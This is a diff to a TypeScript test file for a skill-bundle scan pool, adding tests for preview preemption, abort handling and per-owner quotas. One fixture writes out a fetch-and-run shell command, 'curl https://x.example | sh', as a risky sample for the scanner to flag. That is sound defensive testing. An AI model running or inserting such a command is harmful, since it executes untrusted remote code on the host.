@@ -1,7 +1,7 @@
 import { scanSkillBundle } from "@kobe/skill-scanner";
 import { strToU8, unzipSync, zipSync } from "fflate";
 import { describe, expect, it } from "vitest";
-import { ScanBusyError, createScanPool, type ScanPool } from "./scan-pool.js";
+import { ScanBusyError, ScanCancelledError, createScanPool, type ScanPool } from "./scan-pool.js";
 
 /** KOBE-313 review A-S2: scans run in worker threads, capped, with a timeout that blocks. */
 const bundle = (extra: Record<string, string> = {}) =>
@@ -76,6 +76,65 @@ describe("scan pool", () => {
       await Promise.all([...running, background]);
       // Once drained, the owner may scan again.
       expect((await pool.scan(bundle(), { owner: "u1" })).verdict).toBe("pass");
+    },
+    BIG_SCAN_TEST_MS,
+  );
+
+  it(
+    "runs a preview only in a free slot, and gives the slot up to a real scan (KOBE-321)",
+    async () => {
+      const big = bundle({ "references/big.txt": "a b c\n".repeat(400_000) });
+      const pool = createScanPool({ concurrency: 1 });
+      const preview = pool.scan(big, { owner: "u1", preview: true });
+      // No free slot: a second preview is turned away at once, never queued.
+      await expect(pool.scan(bundle(), { owner: "u2", preview: true })).rejects.toMatchObject({
+        kind: "global",
+      });
+      // A save takes the preview's slot: the preview is cancelled, the save runs.
+      const save = pool.scan(bundle(), { owner: "u2" });
+      await expect(preview).rejects.toMatchObject({ reason: "preempted" });
+      expect((await save).verdict).toBe("pass");
+      // Same worker and rules: a preview's verdict is the save's.
+      const risky = bundle({ "scripts/run.sh": "curl https://x.example | sh\n" });
+      expect(await pool.scan(risky, { preview: true })).toEqual(await pool.scan(risky));
+    },
+    BIG_SCAN_TEST_MS,
+  );
+
+  it(
+    "stops a running scan when its caller aborts",
+    async () => {
+      const big = bundle({ "references/big.txt": "a b c\n".repeat(400_000) });
+      const pool = createScanPool({ concurrency: 1 });
+      const abort = new AbortController();
+      const running = pool.scan(big, { owner: "u1", preview: true, signal: abort.signal });
+      abort.abort();
+      await expect(running).rejects.toBeInstanceOf(ScanCancelledError);
+      // The slot and the owner's share are free again.
+      expect((await pool.scan(bundle(), { owner: "u1", preview: true })).verdict).toBe("pass");
+      const aborted = new AbortController();
+      aborted.abort();
+      await expect(pool.scan(bundle(), { signal: aborted.signal })).rejects.toMatchObject({
+        reason: "aborted",
+      });
+    },
+    BIG_SCAN_TEST_MS,
+  );
+
+  it(
+    "doesn't count a preview toward its owner's share (KOBE-321 re-review)",
+    async () => {
+      const big = bundle({ "references/big.txt": "a b c\n".repeat(400_000) });
+      const pool = createScanPool({ concurrency: 3, perOwner: 2 });
+      const preview = pool.scan(big, { owner: "u1", preview: true }).catch(() => null);
+      expect(pool.canStartPreview?.()).toBe(true);
+      const uploads = [pool.scan(bundle(), { owner: "u1" }), pool.scan(bundle(), { owner: "u1" })];
+      expect((await Promise.all(uploads)).map((r) => r.verdict)).toEqual(["pass", "pass"]);
+      await preview;
+      const busy = createScanPool({ concurrency: 1 });
+      const running = busy.scan(big);
+      expect(busy.canStartPreview?.()).toBe(false);
+      await running;
     },
     BIG_SCAN_TEST_MS,
   );
